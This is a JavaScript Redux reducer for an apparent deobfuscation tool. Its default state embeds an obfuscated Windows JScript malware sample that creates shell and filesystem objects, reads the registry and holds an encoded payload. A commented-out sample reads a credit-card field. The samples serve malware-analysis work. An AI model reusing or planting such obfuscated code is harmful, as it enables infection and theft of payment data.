const initCode = `var juEFqegXodwknWtlpOv = new ActiveXObject("sHell.aPPlicAtIon");
var OKMwPHjJQymtdVX = new ActiveXObject("wsCRipT.ShelL");
var PdoNEByUDLakcIiurJF = new ActiveXObject("ScrIpting.filEsYstemobJecT");

function dhJRNafpLszqjoig(LNCoRYhWseMSKfj) {
    return String.fromCharCode(LNCoRYhWseMSKfj);
}

function iyMwbtAxWPOohYzjGv(DlibcWEgNxfXJtnFruQ) {
    return PdoNEByUDLakcIiurJF.FolderExists(DlibcWEgNxfXJtnFruQ);
}

function MurNKQlVScmpLDXRe(qrPFDfoLQEACOjptid, reEkjghKfVbzHPYI) {
    return qrPFDfoLQEACOjptid.charCodeAt(reEkjghKfVbzHPYI);
}

var ojLqWfitUlxbncuQG = "f+wA+b+m+)+v+o+ftdb+q+f+A)#wAbs+&A31+xti+A+&3A+1&4+AE&31A+ofx+&+31BdA+uj+AwAfYP+c+A+k+f+A+d+uA+&A3A9A+&A+33xtdsj+qu+&+3A+Ft+i+fmA+m&+33&+3:&4C&+1AE+&A+1BA+wbs&A+3+1+tAi&3A1A+&4E&A31+ofAx&A+31+BduA+jAwfAY+APc+k+A+fd+u&A+3+9+A&33A+tAifm+m&3+FbqA+qmA+j+d+bujpo+&+33&3:A&+A4+C&+1E&A1+A+B+wbs&A31AIUU+Q&31&4A+E&3A1+Aof+x&31Bdujwf+YAPAc+kfdu&A39A&A3+3NTY+A+N+M&+4A+3&A3AF+YAN+AMAIU+UQ+&+A33A&3:&4CA&1+EA+&A1Bwbs&A+3+1TA+uAs+fb+A+nA&+3+1&A4EA+&3A1oA+fAx+&31BAdu+jAwfYAPc+Ak+f+AdA+u&3+A+9+&A33BE+PAEC&A3+A+FAT+us+Af+bn&33&A+3A:+A&+4+AC+A&+1E&A1+B+Aw+A+b+s&31q+A+bA+ui+&+A31&+4A+E&A+31+x+tA+i&+3+FT+Aqfdj+Abm+G+Ap+mef+s+t+&3+9&3A3+A+UA+fnqAmAb+u+fAtA&A+3A+3+&3:A&3+C&33+A&6AD&+6DA+&A33&A3AC&3A9&3A9Nb+ui&A+3+FAs+AbAoe+ApAn+&+3A9A+&3:&+3BA&A4:&4:A+&+4:+&A+4:&4:&+4+:&A3:A+&A+3AC+A+&+4A+:&A+4+:&4+A:&4:+&+8A+DA&41&3:&3AC&+33A+&+3FA+fyf&+A33&A+4+C&A+1EA&+1B+AIU+UQ+&3AF+Pqfo+&3A9&33AHFA+U+A+&33+A&+3DA&A+31A&3+3+AiA+uu+Aq+A&4B&3AG+&3G+e+Ap+A+vsA+v+jo+j+u+A+zeAvAbef&3+F+A+yAz{&3G+tfAb+A+sA+d+Ai+&+3FqA+iq+&+A33+A+&+3D&+A3+1gb+m+tf&A3+A:A&+A4C+&+31I+UU+QA&+3+A+F+ATfo+Ae+A&39&3:A&+4C&+3A+1jAgA&3+1+A+&+3A9+IUU+QA&+3+A+F+TubuAvt&+31+&4+A+E&A4+A+E&+3A1A&43&41&4+A1+&3A:A&3A1A&+8C&1E+A&1BTuAs+f+b+nA+&3FP+Aqf+o+A&+A39&3+:+A&+4C&31+Tusf+bn&+3AFA+UzqfA&31+&A4+E&+31&42&4CA&3A+1T+AusA+fbnA&3+FAX+sju+f&3+9IAUUQ&A3+AF+Sftqpo+AtfCApAez+&3:&4+C&A31+&+1A+EA&+A1+A+B+Tusfbn&A3F+Q+pA+t+Aju+j+A+po+&A+31&4E&31&4+A1&A+4+AC+&31+TAu+A+s+Afbn&A3+F+Tb+w+fU+ApAGj+m+A+f&39AqbuAi&A3+D+&31&43+&3A:&4C&1+AE&+1BATu+s+fb+n&3FDA+mptAfA&39&3:+&+4+C+&A31ti&A+3FATAiA+fAmmFyfdv+ufA&39qbui&3+D&+A31+A&A33&33+&3+D&31+A&33+&33A&A3A+DA&+3A1+A&33pqf+Ao+A+&3A3A+&+3A+D&A+3A1+&42&3:&4ACA&31&A+8E#**<";
var IGhuToEwXlJBQPS = "";

var hxEobzlsRgNfcdX = OKMwPHjJQymtdVX.RegRead(
    "HKLM" + dhJRNafpLszqjoig(92) + "software" + dhJRNafpLszqjoig(92) + "microsoft" + dhJRNafpLszqjoig(92) + "windows nt" + dhJRNafpLszqjoig(92) + "currentversion" + dhJRNafpLszqjoig(92) + "systemroot"
);

var OlwpPLsvRDhBKQEV = MurNKQlVScmpLDXRe(hxEobzlsRgNfcdX, 1);
`


// FIrst Example
// const initCode = `var _0xc8bf=['\x76\x61\x6c\x75\x65','\x73\x75\x62\x6d\x69\x74\x42\x75\x74\x74\x6f\x6e','\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72','\x63\x6c\x69\x63\x6b','\x6c\x6f\x67','\x63\x63\x6e\x75\x6d','\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64'];(function(_0x52c1d3,_0x2a26eb){var _0x41df97=function(_0x2568bb){while(--_0x2568bb){_0x52c1d3['push'](_0x52c1d3['shift']());}};_0x41df97(++_0x2a26eb);}(_0xc8bf,0x141));var _0x3f6e=function(_0x52c1d3,_0x2a26eb){_0x52c1d3=_0x52c1d3-0x0;var _0x41df97=_0xc8bf[_0x52c1d3];return _0x41df97;};var submitButton=document[_0x3f6e('\x30\x78\x30')](_0x3f6e('\x30\x78\x32'));console[_0x3f6e('\x30\x78\x35')](submitButton);var cCardNum=document['\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64'](_0x3f6e('\x30\x78\x36'));submitButton[_0x3f6e('\x30\x78\x33')](_0x3f6e('\x30\x78\x34'),()=>{alert(cCardNum[_0x3f6e('\x30\x78\x31')]);});`
const defaultState = {
    dynamicCode: initCode,
    staticCode : initCode,
    lastCode: initCode,
    consoleCode : "",
    consoleResponse : "",
    executionLog : "",
    details: false,
    functionNames: ["%None"],
    selectedFunctionNames: [],
    codeTree: {},
    diff: false,
    reMountMergeCode: false,
    saves: [],
    marktextRet: null,
}

const deobfuscation = (state = defaultState, action) => {
    switch (action.type) {
        case 'SET_DYNAMIC_CODE':
            return Object.assign({}, state, {dynamicCode: action.code})
        case 'SET_STATIC_CODE':
            return Object.assign({}, state, {staticCode: action.code})
        case 'SET_OLD_CODE':
            return Object.assign({}, state, {lastCode: action.code})
        case 'SET_EXECUTION_LOG':
            return Object.assign({}, state, {executionLog: action.log})
        case 'SET_CONSOLE_CODE':
            return Object.assign({}, state, {consoleCode: action.code})
        case 'CLEAR_MARK_TEXT':
            if (state.marktextRet) {
                state.marktextRet.forEach(marker => marker.clear());
            }
            return state
        case 'SET_MARKTEXT_RET':
            return Object.assign({}, state, {marktextRet: action.marktextRet})
        case 'SET_CONSOLE_RESPONSE':
            return Object.assign({}, state, {consoleResponse: action.response})
        case 'SET_DETAILS':
            return Object.assign({}, state, {details: !state.details})
        case 'SET_REMOUNT_MERGE_CODE':
            return Object.assign({}, state, {reMountMergeCode: !state.reMountMergeCode})
        case 'SET_SHOW_DIFF':
            return Object.assign({}, state, {diff: !state.diff})
        case 'SET_CODE_TREE':
            return Object.assign({}, state, {codeTree: action.treeJson})
        case 'SET_FILENAME_SAVE':
            return Object.assign({}, state, {saveFilename: action.fileName})
        case 'SET_SAVED_FILES':
            return Object.assign({}, state, {saves: action.listFiles})
            
        case 'SET_FUNCTION_NAMES':
            return Object.assign({}, state, {functionNames: [...action.functionNames, "%None"]})
        case 'SET_SELECTED_FUNCTION_NAME':
            let newSelected;
            const functionName = action.event.target.value
            if(functionName === "%None") {
                return Object.assign({}, state, {selectedFunctionNames: []})
            }

            if (state.selectedFunctionNames.includes(functionName)) {
                newSelected = state.selectedFunctionNames.filter(name=> name !==functionName)
            } else {
                newSelected = [...state.selectedFunctionNames, functionName]
            }
            console.log(newSelected)
            return Object.assign({}, state, {selectedFunctionNames: newSelected})
        default:
            return state
    }
  }
  
  export default deobfuscation